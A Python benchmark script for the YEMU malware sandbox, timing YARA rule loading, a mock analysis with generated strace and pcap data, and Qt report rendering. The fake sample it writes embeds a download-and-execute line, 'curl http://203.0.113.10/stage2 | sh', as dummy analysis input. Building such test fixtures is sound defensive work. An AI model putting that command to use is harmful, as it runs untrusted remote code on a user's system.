"""
Measures the analysis and report hot spots in a throwaway YEMU_HOME.

    PYTHONPATH=. python scripts/benchmark.py [--rules DIR]

--rules copies DIR (for example %LOCALAPPDATA%/YEMU/rules) into the temporary rules folder; DIR is only read.
"""

import argparse
import asyncio
import gc
import logging
import os
import random
import shutil
import statistics
import sys
import tempfile
import time

HOME = tempfile.mkdtemp(prefix="yemu-bench-")
os.environ["YEMU_HOME"] = HOME
os.environ["QT_QPA_PLATFORM"] = "offscreen"
os.environ["YEMU_NO_UPDATE_CHECK"] = "1"
# keep the output to the result lines: no progress messages or scapy runtime warnings
logging.getLogger().addHandler(logging.NullHandler())
logging.getLogger("scapy").setLevel(logging.ERROR)

from yemu import config as yemu_config  # noqa: E402
from yemu import paths  # noqa: E402
from yemu.core.orchestrator import Orchestrator  # noqa: E402
from yemu.core.vm_manager import MockBackend  # noqa: E402
from yemu.core.yara_engine import YaraEngine  # noqa: E402
from yemu.storage.db import Database  # noqa: E402

RUNS = 3
STRACE_LOGS = 5
STRACE_LINES = 20_000
PCAP_PACKETS = 20_000
REPORT_EVENTS = 20_000


def strace_lines(log_no):
    lines = []
    for i in range(STRACE_LINES):
        ts = f"10:{log_no:02d}:{(i // 1000) % 60:02d}.{i % 1000:03d}{log_no:03d}"
        kind = i % 4
        if kind == 0:
            lines.append(f'{ts} openat(AT_FDCWD, "/usr/lib/x86_64-linux-gnu/lib{i}.so", O_RDONLY|O_CLOEXEC) = 3')
        elif kind == 1:
            lines.append(f'{ts} write(3, "data {i}", 9) = 9')
        elif kind == 2:
            lines.append(f"{ts} mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f0000")
        else:
            lines.append(
                f"{ts} connect(4, {{sa_family=AF_INET, sin_port=htons(443), "
                f'sin_addr=inet_addr("10.0.{i % 250}.{log_no}")}}, 16) = -1 ENETUNREACH'
            )
    return lines


def write_pcap(path):
    from scapy.all import DNS, DNSQR, IP, TCP, UDP, Ether, Raw, wrpcap

    payload = b"x" * 800
    eth = Ether(src="52:54:00:12:34:56", dst="52:54:00:12:35:02")
    packets = []
    for i in range(PCAP_PACKETS):
        ip = IP(src="10.0.2.15", dst=f"203.0.113.{i % 200}")
        if i % 10 == 0:
            packets.append(eth / ip / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=f"host{i % 300}.example.com")))
        else:
            packets.append(eth / ip / TCP(dport=443, flags="PA") / Raw(payload))
    wrpcap(path, packets)


class BenchBackend(MockBackend):
    MOCK_STRACE = {f"strace.{1000 + n}": strace_lines(n) for n in range(STRACE_LOGS)}
    PCAP_PATH = ""

    async def pull_file(self, vm_name, guest_path, local_path):
        if guest_path.endswith(".pcap"):
            shutil.copyfile(self.PCAP_PATH, local_path)
        return True


def bench_yara_load():
    import yara

    real_compile = yara.compile
    calls = 0

    def counting_compile(*args, **kwargs):
        nonlocal calls
        calls += 1
        return real_compile(*args, **kwargs)

    yara.compile = counting_compile
    times = []
    try:
        for _ in range(RUNS):
            start = time.perf_counter()
            YaraEngine(rules_dir=paths.synced_rules_dir())
            times.append(time.perf_counter() - start)
    finally:
        yara.compile = real_compile
    median = statistics.median(times)
    print(f"yara-load: median {median:.2f}s over {RUNS} runs, {calls // RUNS} yara.compile calls per load")


async def heartbeat(stop):
    """Returns the longest time the loop kept a 10 ms sleep waiting beyond its due time."""
    longest = 0.0
    last = time.perf_counter()
    while not stop.is_set():
        await asyncio.sleep(0.01)
        now = time.perf_counter()
        longest = max(longest, now - last - 0.01)
        last = now
    return longest


async def bench_mock_analysis(sample):
    db = Database()
    await db.connect()
    cfg = yemu_config.load()
    cfg["analysis"]["execution_wait"] = 0
    times, max_stall = [], 0.0
    details = {}
    try:
        for _ in range(RUNS):
            stop = asyncio.Event()
            beat = asyncio.create_task(heartbeat(stop))
            await asyncio.sleep(0)
            start = time.perf_counter()
            aid = await Orchestrator(db, vm_manager=BenchBackend(), config=cfg).run_analysis(sample, run_pcap=True)
            times.append(time.perf_counter() - start)
            stop.set()
            max_stall = max(max_stall, await beat)
            details = await db.get_analysis_details(aid)
    finally:
        await db.close()
    print(
        f"mock-analysis: median {statistics.median(times):.2f}s over {RUNS} runs, "
        f"max event-loop stall {max_stall:.2f}s, status={details['status']} score={details['threat_score']}"
    )


async def seed_report():
    from datetime import datetime

    db = Database()
    await db.connect()
    try:
        sample_id = await db.add_sample("a" * 64, "b" * 32, "big-report.bin", "unknown", 1234)
        aid = await db.create_analysis(sample_id, datetime.now(), guest_os="mock-ubuntu", snapshot="clean-baseline")
        rows = [
            (
                "file",
                36000 + i / 1000,
                "INFO",
                {
                    "type": "file",
                    "action": "open",
                    "path": f"/usr/share/data/file-{i}.dat",
                    "pid": str(1000 + i % 7),
                    "process_name": "sample",
                    "timestamp": 36000 + i / 1000,
                    "raw": f'openat(AT_FDCWD, "/usr/share/data/file-{i}.dat", O_RDONLY) = 3',
                },
            )
            for i in range(REPORT_EVENTS)
        ]
        await db.add_events(aid, rows)
        await db.update_analysis(
            aid, finished_at=datetime.now(), threat_score=10, verdict="clean", yara_matches=[], status="completed"
        )
        return aid
    finally:
        await db.close()


def pump_until(app, cond, timeout=120):
    longest = 0.0
    end = time.perf_counter() + timeout
    while not cond():
        if time.perf_counter() > end:
            raise TimeoutError("benchmark condition never became true")
        start = time.perf_counter()
        app.processEvents()
        longest = max(longest, time.perf_counter() - start)
        time.sleep(0.001)
    return longest


def bench_report(aid):
    from PySide6.QtWidgets import QApplication

    from yemu.gui.app import create_window

    app = QApplication.instance() or QApplication([])
    ctx, win = create_window(app)
    win.show()
    try:
        pump_until(app, lambda: ctx.db_ready)
        report = win.pages["report"]
        start = time.perf_counter()
        win.open_report(aid)
        stall = pump_until(app, lambda: report.report is not None)
        populate = time.perf_counter() - start
        print(f"report-open: {populate:.2f}s to populate, max Qt-thread stall {stall:.2f}s")

        raw_tab = next(i for i in range(report.tabs.count()) if report.tabs.tabText(i) == "Raw JSON")
        start = time.perf_counter()
        report.tabs.setCurrentIndex(raw_tab)
        longest = time.perf_counter() - start
        longest = max(longest, pump_until(app, lambda: report.raw_view.toPlainText().startswith("{")))
        print(f"raw-json-tab: {longest:.2f}s")
    finally:
        ctx.shutdown()
        win.close()
        win.deleteLater()
        app.processEvents()


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--rules", help="rules folder to copy into the temporary YEMU_HOME (read only)")
    args = parser.parse_args()
    try:
        if args.rules:
            shutil.copytree(args.rules, paths.synced_rules_dir(), dirs_exist_ok=True)
        BenchBackend.PCAP_PATH = os.path.join(HOME, "bench.pcap")
        write_pcap(BenchBackend.PCAP_PATH)
        gc.collect()  # the generated packets are cyclic garbage; don't bill their collection to the first run
        sample = os.path.join(HOME, "sample.bin")
        with open(sample, "wb") as f:
            f.write(b"#!/bin/sh\ncurl http://203.0.113.10/stage2 | sh\n" + random.Random(0).randbytes(1 << 20))

        bench_yara_load()
        asyncio.run(bench_mock_analysis(sample))
        aid = asyncio.run(seed_report())
        bench_report(aid)
    finally:
        logging.shutdown()  # release yemu.log so the home can be deleted
        shutil.rmtree(HOME)
    return 0


if __name__ == "__main__":
    sys.exit(main())
